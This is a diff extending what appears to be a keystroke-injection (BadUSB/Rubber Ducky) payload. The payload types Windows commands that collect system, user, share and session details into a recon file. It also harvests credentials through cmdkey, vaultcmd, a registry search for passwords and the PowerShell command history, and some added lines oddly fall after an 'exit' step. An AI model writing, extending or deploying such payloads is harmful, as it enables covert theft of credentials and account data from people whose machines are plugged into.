@@ -11,7 +11,19 @@ STRING systeminfo > recon.txt
 DELAY 500
 ENTER
 DELAY 3000
+STRING whoami /all >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
 STRING net users >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING net accounts >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING net share >> recon.txt
 DELAY 500
 ENTER
 DELAY 1000
@@ -51,6 +63,10 @@ STRING cmdkey /list >> recon.txt
 DELAY 500
 ENTER
 DELAY 1000
+STRING vaultcmd /listcreds:"Windows Credentials" /all >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
 STRING reg query HKCU /f password /t REG_SZ /s >> recon.txt
 DELAY 500
 ENTER
@@ -81,4 +97,12 @@ ENTER
 DELAY 1000
 STRING exit
 DELAY 500
+STRING qwinsta >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING more AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt >> recon.txt
+DELAY 500
+ENTER
+DELAY 1000
 ENTER
